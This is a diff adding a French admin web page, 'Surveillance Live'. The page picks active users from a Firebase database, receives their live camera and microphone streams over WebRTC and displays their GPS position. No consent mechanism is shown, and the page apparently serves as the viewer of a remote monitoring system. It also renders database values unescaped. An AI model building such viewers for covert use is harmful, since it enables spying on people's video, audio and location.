@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin - Surveillance Live</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+            background: #0f172a;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 32px;
+            border-radius: 24px;
+            margin-bottom: 24px;
+        }
+
+        h1 {
+            font-size: 2rem;
+            margin-bottom: 8px;
+        }
+
+        .user-selector {
+            background: white;
+            padding: 20px;
+            border-radius: 16px;
+            margin-bottom: 24px;
+        }
+
+        select {
+            width: 100%;
+            padding: 12px;
+            border-radius: 12px;
+            border: 1px solid #e2e8f0;
+            font-size: 1rem;
+            margin-top: 8px;
+        }
+
+        .live-viewer {
+            background: black;
+            border-radius: 24px;
+            overflow: hidden;
+            margin-bottom: 24px;
+            position: relative;
+            min-height: 400px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        video {
+            width: 100%;
+            background: black;
+            max-height: 60vh;
+            display: block;
+        }
+
+        .controls {
+            background: white;
+            padding: 20px;
+            border-radius: 16px;
+            margin-bottom: 24px;
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        button {
+            padding: 12px 24px;
+            border-radius: 12px;
+            border: none;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 1rem;
+        }
+
+        .btn-primary {
+            background: #667eea;
+            color: white;
+        }
+
+        .btn-danger {
+            background: #ef4444;
+            color: white;
+        }
+
+        .fullscreen-btn {
+            background: #1e293b;
+            color: white;
+        }
+
+        .status {
+            background: #1e293b;
+            color: white;
+            padding: 12px;
+            border-radius: 12px;
+            text-align: center;
+        }
+
+        .live-badge {
+            background: #dc2626;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            animation: pulse 1s infinite;
+            display: inline-block;
+            margin-left: 10px;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+
+        .user-info {
+            background: white;
+            padding: 16px;
+            border-radius: 12px;
+            margin-bottom: 16px;
+            display: none;
+        }
+
+        .connection-log {
+            background: #1e293b;
+            color: #94a3b8;
+            padding: 8px;
+            border-radius: 8px;
+            font-size: 0.7rem;
+            margin-top: 8px;
+            font-family: monospace;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+
+        .no-video-overlay {
+            position: absolute;
+            color: white;
+            text-align: center;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🎥 Administration - Live View</h1>
+            <p>Visualisation en temps réel des utilisateurs</p>
+        </div>
+
+        <div class="user-selector">
+            <label>👤 Sélectionner un utilisateur:</label>
+            <select id="userSelect">
+                <option value="">-- Chargement des utilisateurs --</option>
+            </select>
+        </div>
+
+        <div id="userInfo" class="user-info"></div>
+
+        <div class="live-viewer" id="liveViewer">
+            <video id="remoteVideo" autoplay playsinline muted></video>
+            <div id="noVideoOverlay" class="no-video-overlay" style="display: none;">
+                📭 En attente du flux vidéo...
+            </div>
+        </div>
+
+        <div class="controls">
+            <button id="connectBtn" class="btn-primary">🔗 Se connecter</button>
+            <button id="disconnectBtn" class="btn-danger" disabled>⏹️ Déconnecter</button>
+            <button id="fullscreenBtn" class="fullscreen-btn" disabled>🖥️ Plein écran</button>
+        </div>
+
+        <div id="status" class="status">
+            💡 Sélectionnez un utilisateur
+        </div>
+        <div id="connectionLog" class="connection-log"></div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-app.js";
+        import { getDatabase, ref, onValue, push, get, set } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyCiTlZ2IyY-y4vOHi0zrvHsp-Ro95wzFaU",
+            authDomain: "universite-taak.firebaseapp.com",
+            databaseURL: "https://universite-taak-default-rtdb.firebaseio.com",
+            projectId: "universite-taak",
+            storageBucket: "universite-taak.firebasestorage.app",
+            messagingSenderId: "550634728649",
+            appId: "1:550634728649:web:12147e8dec3a04618c3118",
+            measurementId: "G-RD7KY6BFP4"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        let peerConnection = null;
+        let currentUserId = null;
+
+        const remoteVideo = document.getElementById('remoteVideo');
+        const connectBtn = document.getElementById('connectBtn');
+        const disconnectBtn = document.getElementById('disconnectBtn');
+        const fullscreenBtn = document.getElementById('fullscreenBtn');
+        const statusDiv = document.getElementById('status');
+        const connectionLog = document.getElementById('connectionLog');
+        const userSelect = document.getElementById('userSelect');
+        const userInfoDiv = document.getElementById('userInfo');
+        const noVideoOverlay = document.getElementById('noVideoOverlay');
+
+        const configuration = {
+            iceServers: [
+                { urls: 'stun:stun.l.google.com:19302' },
+                { urls: 'stun:stun1.l.google.com:19302' },
+                { urls: 'stun:stun2.l.google.com:19302' }
+            ]
+        };
+
+        function addLog(message) {
+            const time = new Date().toLocaleTimeString();
+            connectionLog.innerHTML = `[${time}] ${message}<br>` + connectionLog.innerHTML;
+        }
+
+        function setStatus(message, isLive = false) {
+            statusDiv.innerHTML = message;
+            if (isLive) {
+                statusDiv.style.background = '#dc2626';
+                statusDiv.innerHTML += ' <span class="live-badge">LIVE</span>';
+            } else {
+                statusDiv.style.background = '#1e293b';
+            }
+        }
+
+        // Charger les utilisateurs actifs
+        function loadUsers() {
+            const usersRef = ref(database, 'users');
+            onValue(usersRef, (snapshot) => {
+                const users = snapshot.val();
+                userSelect.innerHTML = '<option value="">-- Sélectionner un utilisateur --</option>';
+                
+                if (users) {
+                    Object.keys(users).forEach(userId => {
+                        if (users[userId].active && users[userId].active === true) {
+                            userSelect.innerHTML += `<option value="${userId}">👤 Utilisateur #${userId.slice(-6)} (Actif)</option>`;
+                        }
+                    });
+                }
+                
+                if (userSelect.options.length === 1) {
+                    userSelect.innerHTML = '<option value="">-- Aucun utilisateur actif --</option>';
+                }
+            });
+        }
+
+        // Charger les infos utilisateur
+        function loadUserInfo(userId) {
+            const locationRef = ref(database, `users/${userId}/location`);
+            onValue(locationRef, (snapshot) => {
+                const location = snapshot.val();
+                if (location) {
+                    userInfoDiv.style.display = 'block';
+                    userInfoDiv.innerHTML = `
+                        <strong>📍 Position GPS:</strong><br>
+                        Latitude: ${location.lat}<br>
+                        Longitude: ${location.lng}<br>
+                        <a href="https://www.google.com/maps?q=${location.lat},${location.lng}" 
+                           target="_blank" style="color: #667eea;">
+                            🗺️ Voir sur Google Maps
+                        </a>
+                        <br><small>Dernière mise à jour: ${new Date(location.timestamp).toLocaleString()}</small>
+                    `;
+                } else {
+                    userInfoDiv.style.display = 'none';
+                }
+            });
+        }
+
+        async function connectToUser() {
+            currentUserId = userSelect.value;
+            if (!currentUserId) {
+                setStatus("⚠️ Sélectionnez un utilisateur d'abord");
+                return;
+            }
+
+            setStatus("🔄 Connexion à l'utilisateur...");
+            connectBtn.disabled = true;
+            addLog("🔍 Recherche de l'offre utilisateur...");
+            
+            // Cacher l'overlay
+            noVideoOverlay.style.display = 'block';
+            
+            try {
+                // Récupérer l'offre de l'utilisateur
+                const offerRef = ref(database, `webrtc/${currentUserId}/offer`);
+                const offerSnapshot = await get(offerRef);
+                const offer = offerSnapshot.val();
+                
+                if (!offer) {
+                    setStatus("❌ Aucune offre trouvée");
+                    addLog("❌ Aucune offre trouvée");
+                    connectBtn.disabled = false;
+                    return;
+                }
+                
+                addLog("✅ Offre trouvée, création de la connexion...");
+                
+                // Créer la connexion
+                peerConnection = new RTCPeerConnection(configuration);
+                
+                // Suivi de l'état de la connexion
+                peerConnection.onconnectionstatechange = () => {
+                    addLog(`État connexion: ${peerConnection.connectionState}`);
+                    if (peerConnection.connectionState === 'connected') {
+                        setStatus("🔴 LIVE - Visualisation en cours", true);
+                        fullscreenBtn.disabled = false;
+                        noVideoOverlay.style.display = 'none';
+                    } else if (peerConnection.connectionState === 'failed') {
+                        setStatus("❌ Connexion échouée");
+                        addLog("❌ Échec de la connexion");
+                    }
+                };
+                
+                peerConnection.oniceconnectionstatechange = () => {
+                    addLog(`État ICE: ${peerConnection.iceConnectionState}`);
+                };
+                
+                // Gérer les tracks entrants (VIDÉO + AUDIO)
+                peerConnection.ontrack = (event) => {
+                    addLog(`📡 Track reçu: ${event.track.kind}`);
+                    if (remoteVideo.srcObject !== event.streams[0]) {
+                        remoteVideo.srcObject = event.streams[0];
+                        addLog("✅ Flux vidéo/audio attaché au vidéo tag !");
+                        
+                        // Forcer la lecture
+                        remoteVideo.play().catch(e => console.log("Erreur play:", e));
+                        
+                        // Masquer l'overlay
+                        noVideoOverlay.style.display = 'none';
+                    }
+                };
+                
+                // S'assurer que la vidéo se lance
+                remoteVideo.onloadedmetadata = () => {
+                    addLog("🎬 Métadonnées chargées, lecture");
+                    remoteVideo.play().catch(e => console.log(e));
+                };
+                
+                remoteVideo.oncanplay = () => {
+                    addLog("🎬 La vidéo peut être lue");
+                    remoteVideo.play().catch(e => console.log(e));
+                };
+                
+                // Définir l'offre
+                await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
+                addLog("📝 Offre définie");
+                
+                // Créer la réponse
+                const answer = await peerConnection.createAnswer();
+                await peerConnection.setLocalDescription(answer);
+                addLog("📝 Réponse créée");
+                
+                // Envoyer la réponse
+                const answerRef = ref(database, `webrtc/${currentUserId}/answer`);
+                await set(answerRef, {
+                    sdp: answer.sdp,
+                    type: answer.type,
+                    timestamp: Date.now()
+                });
+                addLog("📤 Réponse envoyée");
+                
+                // Gérer les candidats ICE locaux
+                peerConnection.onicecandidate = (event) => {
+                    if (event.candidate) {
+                        const candidateRef = ref(database, `webrtc/${currentUserId}/admin-candidates`);
+                        push(candidateRef, event.candidate);
+                        addLog("📡 Candidat ICE envoyé");
+                    }
+                };
+                
+                // Récupérer les candidats ICE de l'utilisateur
+                const candidatesRef = ref(database, `webrtc/${currentUserId}/candidates`);
+                onValue(candidatesRef, (snapshot) => {
+                    const candidates = snapshot.val();
+                    if (candidates && peerConnection) {
+                        Object.values(candidates).forEach(candidate => {
+                            try {
+                                peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
+                                addLog("✅ Candidat ICE utilisateur ajouté");
+                            } catch(e) {
+                                addLog(`❌ Erreur ICE: ${e.message}`);
+                            }
+                        });
+                    }
+                });
+                
+                disconnectBtn.disabled = false;
+                loadUserInfo(currentUserId);
+                
+            } catch (error) {
+                console.error("Erreur:", error);
+                setStatus("❌ Erreur: " + error.message);
+                addLog(`❌ Erreur: ${error.message}`);
+                connectBtn.disabled = false;
+            }
+        }
+
+        function disconnect() {
+            if (peerConnection) {
+                peerConnection.close();
+                peerConnection = null;
+            }
+            
+            remoteVideo.srcObject = null;
+            remoteVideo.pause();
+            userInfoDiv.style.display = 'none';
+            connectBtn.disabled = false;
+            disconnectBtn.disabled = true;
+            fullscreenBtn.disabled = true;
+            setStatus("🔌 Déconnecté");
+            addLog("🔌 Déconnecté");
+            noVideoOverlay.style.display = 'block';
+        }
+
+        function toggleFullscreen() {
+            const viewer = document.getElementById('liveViewer');
+            if (!viewer) return;
+            
+            if (!document.fullscreenElement) {
+                viewer.requestFullscreen().catch(err => {
+                    console.error(err);
+                });
+            } else {
+                document.exitFullscreen();
+            }
+        }
+
+        connectBtn.addEventListener('click', connectToUser);
+        disconnectBtn.addEventListener('click', disconnect);
+        fullscreenBtn.addEventListener('click', toggleFullscreen);
+        
+        userSelect.addEventListener('change', () => {
+            disconnect();
+        });
+
+        // Charger les utilisateurs au démarrage
+        loadUsers();
+    </script>
+</body>
+</html>
